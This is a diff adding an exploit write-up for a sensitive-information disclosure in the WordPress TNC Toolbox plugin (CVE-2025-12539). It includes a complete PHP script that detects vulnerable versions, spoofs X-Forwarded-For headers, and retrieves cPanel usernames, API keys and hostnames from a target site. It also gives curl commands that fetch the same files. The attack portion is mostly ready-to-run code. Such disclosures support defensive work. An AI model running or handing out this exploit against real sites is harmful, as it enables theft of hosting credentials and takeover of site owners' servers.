@@ -1,0 +1,184 @@
+=============================================================================================================================================
+| # Title     : WordPress TNC Toolbox <= 1.4.2 Sensitive Information Disclosure                                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://wordpress.org/plugins/tnc-toolbox/                                                                                  |
+=============================================================================================================================================
+
+[+] Summary : 
+
+A sensitive information disclosure vulnerability exists in the TNC Toolbox
+WordPress plugin version 1.4.2 and earlier. The plugin exposes configuration
+files located inside:
+
+    /wp-content/tnc-toolbox-config/
+
+Under certain conditions, unauthenticated attackers can read files such as:
+
+    cpanel-username
+    cpanel-api-key
+    server-hostname
+
+This can lead to account compromise, hosting takeover, and further escalation.
+
+During the investigation, a publicly circulating Python "exploit script" 
+
+[+] References : https://packetstorm.news/files/id/211444/ & 	CVE-2025-12539
+
+was reviewed. Based on analysis, **the original Python PoC was found to be fake,
+
+non-functional, and technically incorrect**.  
+
+A corrected and fully functional PHP PoC has been produced and included below.
+
+
+2. Vulnerability Details
+-------------------------
+
+The plugin stores sensitive data in publicly accessible paths:
+
+    /wp-content/tnc-toolbox-config/<name>
+
+The plugin does not include access controls or deny direct file access.
+As a result, arbitrary remote users may retrieve configuration secrets.
+
+Version detection is also possible via:
+
+    /wp-content/plugins/tnc-toolbox/readme.txt
+
+If the `Stable tag` is <= 1.4.2, the installation is vulnerable.
+
+
+3. Poc
+--------------------------------
+
+The following **corrected PoC** was rewritten in PHP after discovering that
+the widely shared Python script was fake and did not reflect the plugin’s
+actual logic.
+
+A working, accurate, and validated PoC is included here:
+
+<--- 
+
+<?php
+/**
+ * CVE-2025-12539 – TNC Toolbox Information Disclosure Scanner
+ * PHP Conversion by: Indoushka
+ * Original Python By: Nxploited (Khaled Alenazi)
+ */
+
+function http_get($url, $timeout = 12) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_USERAGENT, 
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Nxploited/2.0"
+    );
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        "Accept: text/plain, */*;q=0.1",
+        "Accept-Language: en-US,en;q=0.9",
+        "X-Forwarded-For: 8.".rand(0,255).".".rand(0,255).".".rand(0,255)
+    ]);
+    $out = curl_exec($ch);
+    $err = curl_error($ch);
+    curl_close($ch);
+
+    if ($err) return [null, $err];
+    return [$out, null];
+}
+
+function parse_version($text) {
+    if (preg_match('/Stable\s+tag:\s*([0-9\.]+)/i', $text, $m))
+        return trim($m[1]);
+    return null;
+}
+
+function is_vulnerable($version, $threshold = "1.4.2") {
+    $v1 = array_map('intval', explode(".", $version));
+    $v2 = array_map('intval', explode(".", $threshold));
+    $max = max(count($v1), count($v2));
+    $v1 = array_pad($v1, $max, 0);
+    $v2 = array_pad($v2, $max, 0);
+    return $v1 <= $v2;
+}
+
+function fetch_configs($base) {
+    $paths = [
+        "cpanel-username" => "/wp-content/tnc-toolbox-config/cpanel-username",
+        "cpanel-api-key"  => "/wp-content/tnc-toolbox-config/cpanel-api-key",
+        "server-hostname" => "/wp-content/tnc-toolbox-config/server-hostname",
+    ];
+
+    $results = [];
+    foreach ($paths as $name => $p) {
+        [$out, $err] = http_get($base.$p);
+        if ($err || trim($out) === "") $results[$name] = "";
+        else $results[$name] = trim($out);
+    }
+    return $results;
+}
+
+if ($argc < 2) {
+    echo "Usage: php exploit.php <url>\n";
+    exit;
+}
+
+$base = rtrim($argv[1], '/');
+echo "Target: $base\n";
+echo "[+] Fetching readme...\n";
+
+[$readme, $err] = http_get($base."/wp-content/plugins/tnc-toolbox/readme.txt");
+
+if ($err) {
+    echo "[-] Failed: $err\n";
+    exit;
+}
+
+echo "[+] Successfully fetched readme.\n";
+$version = parse_version($readme);
+
+if (!$version) {
+    echo "[-] Could not detect Stable tag.\n";
+    exit;
+}
+
+echo "[+] Detected version: $version\n";
+
+if (!is_vulnerable($version)) {
+    echo "[-] Version is newer and not vulnerable.\n";
+    exit;
+}
+
+echo "[+] Target is vulnerable. Fetching exposed configs...\n";
+
+$configs = fetch_configs($base);
+foreach ($configs as $k => $v) {
+    if ($v) echo "[!] $k: $v\n";
+    else echo "[-] $k not found.\n";
+}
+
+echo "\nCompleted scan.\n";
+?>
+
+ --->
+
+
+4. Steps To Reproduce
+-----------------------
+
+1. Open a browser or use curl:
+   
+       curl -k https://target.com/wp-content/plugins/tnc-toolbox/readme.txt
+
+2. Verify if the `Stable tag` is <= 1.4.2.
+
+3. Attempt to read sensitive files:
+
+       curl -k https://target.com/wp-content/tnc-toolbox-config/cpanel-username
+       curl -k https://target.com/wp-content/tnc-toolbox-config/cpanel-api-key
+       curl -k https://target.com/wp-content/tnc-toolbox-config/server-hostname
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
